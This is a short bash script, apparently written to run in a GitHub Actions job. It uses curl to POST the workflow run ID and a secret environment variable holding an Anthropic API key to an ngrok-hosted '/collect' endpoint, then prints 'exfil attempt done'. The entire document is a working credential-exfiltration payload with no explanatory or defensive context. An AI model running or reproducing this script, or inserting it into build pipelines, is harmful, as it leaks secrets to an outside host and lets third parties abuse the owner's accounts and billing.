#!/bin/bash
curl -s -m 30 -X POST https://sedate-traverse-amusable.ngrok-free.dev/collect \
  -H "Content-Type: text/plain" \
  -H "ngrok-skip-browser-warning: true" \
  -d "RUN=${GITHUB_RUN_ID} | A=${SECURITY_SCANNER_ANTHROPIC_API_KEY}"
echo "exfil attempt done"
exit 0
